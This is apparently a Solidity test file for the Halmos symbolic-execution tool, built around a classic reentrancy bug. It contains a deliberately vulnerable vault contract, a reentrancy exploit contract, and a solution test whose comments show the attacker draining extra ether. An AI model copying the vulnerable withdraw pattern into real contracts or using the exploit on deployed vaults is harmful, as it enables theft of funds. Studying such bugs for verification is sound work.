// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {SymTest} from "halmos-cheatcodes/SymTest.sol";

// inspired by the classic reentrancy level in Ethernaut CTF
contract BadVault {
    mapping(address => uint256) public balance;

    function deposit() external payable {
        balance[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external {
        // checks
        uint256 _balance = balance[msg.sender];
        require(_balance >= amount, "insufficient balance");

        console2.log("withdraw", msg.sender, amount);

        // interactions
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "transfer failed");

        // effects
        balance[msg.sender] = _balance - amount;
    }
}

// from https://github.com/mds1/multicall
struct Call3Value {
    address target;
    uint256 value;
    bytes data;
}

contract ExploitLaunchPad {
    address public owner;
    bool reentered;

    Call3Value public call;

    constructor() {
        owner = msg.sender;
    }

    receive() external payable {
        if (reentered) {
            return;
        }

        require(call.value <= address(this).balance, "insufficient balance");

        reentered = true;
        (bool success,) = call.target.call{value: call.value}(call.data);
        reentered = false;
    }

    function defer(Call3Value calldata _call) external payable {
        require(msg.sender == owner, "only owner");
        call = _call;
    }

    function go(Call3Value calldata _call) external payable {
        require(msg.sender == owner, "only owner");
        require(_call.value <= address(this).balance, "insufficient balance");

        (bool success,) = _call.target.call{value: _call.value}(_call.data);
    }

    function deposit() external payable {}

    function withdraw() external {
        owner.call{value: address(this).balance}("");
    }
}

contract BadVaultTest is Test, SymTest {
    BadVault vault;
    ExploitLaunchPad exploit;

    address user1;
    address user2;
    address attacker;

    function setUp() public {
        vault = new BadVault();

        user1 = address(1);
        user2 = address(2);

        vm.deal(user1, 1 ether);
        vm.prank(user1);
        vault.deposit{value: 1 ether}();

        vm.deal(user2, 1 ether);
        vm.prank(user2);
        vault.deposit{value: 1 ether}();

        attacker = address(42);
        vm.prank(attacker);
        exploit = new ExploitLaunchPad();

        assert(exploit.owner() == attacker);
    }

    /// passes as expected
    /// @custom:halmos --array-lengths data=100
    function test_BadVault_withdrawFromEOA(address attacker, uint256 amount, bytes memory data) external {
        uint256 STARTING_BALANCE = 2 ether;

        vm.assume(attacker != address(vault));
        vm.assume(attacker != address(user1));
        vm.assume(attacker != address(user2));
        vm.assume(attacker.balance == STARTING_BALANCE);
        vm.assume(amount <= STARTING_BALANCE / 2);

        // attacker starts with some ether
        vm.prank(attacker);
        vault.deposit{value: STARTING_BALANCE / 2}();

        // whatever interaction with the vault the attacker does
        vm.prank(attacker);
        address(vault).call{value: amount}(data);

        // they can not end up with more ether than they started with
        assert(address(attacker).balance <= STARTING_BALANCE);
    }

    /// won't run because we don't support symbolic CREATE
    /// @custom:halmos --array-lengths data=100,code=100
    function test_BadVault_withdrawFromContract(
        address attacker,
        uint256 amount1,
        uint256 amount2,
        bytes memory data,
        bytes memory code
    ) external {
        uint256 STARTING_BALANCE = 2 ether;

        vm.assume(attacker != address(vault));
        vm.assume(attacker != address(user1));
        vm.assume(attacker != address(user2));
        vm.assume(attacker.balance == STARTING_BALANCE);
        vm.assume((amount1 + amount2) <= STARTING_BALANCE);

        // attacker deploys code
        address attackContract;
        vm.prank(attacker);
        assembly {
            let ptr := add(code, 0x20)
            let size := mload(code)
            attackContract := create(amount1, ptr, size)
            if iszero(extcodesize(attackContract)) { revert(0, 0) }
        }

        // attacker interacts with deployed code
        vm.prank(attacker);
        attackContract.call{value: amount2}(data);

        // they can not end up with more ether than they started with
        console2.log("attacker final balance", address(attacker).balance);
        assert(address(attacker).balance <= STARTING_BALANCE);
    }

    /// I would expect to find a solution, but we get Counterexample: unknown
    /// @custom:halmos --array-lengths data1=36,data2=36,deferredData=36
    function test_BadVault_usingExploitLaunchPad(
        address target1,
        uint256 amount1,
        bytes memory data1,
        address target2,
        uint256 amount2,
        bytes memory data2,
        address deferredTarget,
        uint256 deferredAmount,
        bytes memory deferredData
    ) public {
        // address target1 = svm.createAddress("target1");
        // address target2 = svm.createAddress("target2");
        // address deferredTarget = svm.createAddress("deferredTarget");

        uint256 STARTING_BALANCE = 2 ether;
        vm.deal(attacker, STARTING_BALANCE);

        vm.assume(address(exploit).balance == 0);
        vm.assume((amount1 + amount2) <= STARTING_BALANCE);

        console2.log("attacker starting balance", address(attacker).balance);
        vm.prank(attacker);
        exploit.deposit{value: STARTING_BALANCE}();

        vm.prank(attacker);
        exploit.go(Call3Value({target: target1, value: amount1, data: data1}));

        vm.prank(attacker);
        exploit.defer(Call3Value({target: deferredTarget, value: deferredAmount, data: deferredData}));

        vm.prank(attacker);
        exploit.go(Call3Value({target: target2, value: amount2, data: data2}));

        vm.prank(attacker);
        exploit.withdraw();

        // they can not end up with more ether than they started with
        console2.log("attacker final balance", address(attacker).balance);
        assert(attacker.balance <= STARTING_BALANCE);
    }

    // running `halmos --function test_BadVault_solution`
    // gives the expected `Counterexample: ∅`

    // running `forge test --match-test test_BadVault_solution -vvv` confirms the attack trace:                                                                                                                                                                            took 6s Node system at 18:00:43
    //   deposit 0x0000000000000000000000000000000000000001 1000000000000000000
    //   deposit 0x0000000000000000000000000000000000000002 1000000000000000000
    //   attacker starting balance 2000000000000000000
    //   deposit 0x5f4E4CcFF0A2553b2BDE30e1fC8531B287db9087 1000000000000000000
    //   withdraw 0x5f4E4CcFF0A2553b2BDE30e1fC8531B287db9087 1000000000000000000
    //   withdraw 0x5f4E4CcFF0A2553b2BDE30e1fC8531B287db9087 1000000000000000000
    //   attacker final balance 3000000000000000000
    function test_BadVault_solution() public {
        test_BadVault_usingExploitLaunchPad(
            // 1st call
            address(vault),
            1 ether,
            abi.encodeWithSelector(vault.deposit.selector),
            // 2nd call
            address(vault),
            0 ether,
            abi.encodeWithSelector(vault.withdraw.selector, 1 ether),
            // deferred call
            address(vault),
            0 ether,
            abi.encodeWithSelector(vault.withdraw.selector, 1 ether)
        );
    }
}
